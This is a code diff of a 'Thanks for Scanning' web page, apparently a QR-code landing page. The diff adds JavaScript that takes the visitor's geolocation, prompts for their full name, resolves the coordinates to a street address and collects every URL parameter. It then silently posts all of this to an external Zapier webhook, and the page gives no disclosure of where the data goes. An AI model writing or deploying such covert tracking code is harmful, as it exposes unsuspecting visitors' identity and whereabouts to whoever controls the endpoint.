@@ -2,22 +2,50 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
     <title>Thanks for Scanning</title>
     <script>
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramStr = "";
+            for (let param of params) {
+                paramStr += `&${param[0]}=${param[1]}`;
+            }
+            return paramStr;
+        }
+
+        function promptForName() {
+            let name = localStorage.getItem('userName');
+            if (!name) {
+                name = prompt("Please enter your full name:");
+                if (name) {
+                    localStorage.setItem('userName', name);
+                }
+            }
+            return name;
+        }
+
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var latitude = position.coords.latitude;
                     var longitude = position.coords.longitude;
-                    var name = "generator";
+                    var name = promptForName();
 
-                    var xhr = new XMLHttpRequest();
-                    var url = "https://hooks.zapier.com/hooks/catch/11099321/29v5fca/";
-                    var params = "latitude=" + latitude + "&longitude=" + longitude + "&name=" + name;
-                    xhr.open("POST", url, true);
-                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send(params);
+                    var geocodeUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_API_KEY`;
+
+                    fetch(geocodeUrl)
+                        .then(response => response.json())
+                        .then(data => {
+                            var address = data.results[0].formatted_address;
+                            var xhr = new XMLHttpRequest();
+                            var url = "https://hooks.zapier.com/hooks/catch/11099321/29v5fca/";
+                            var params = `latitude=${latitude}&longitude=${longitude}&address=${encodeURIComponent(address)}&name=${encodeURIComponent(name)}`;
+                            params += getQueryParams();
+                            xhr.open("POST", url, true);
+                            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                            xhr.send(params);
+                        })
+                        .catch(error => console.error('Error:', error));
                 }, function(error) {
                     console.error("Error Code = " + error.code + " - " + error.message);
                 });
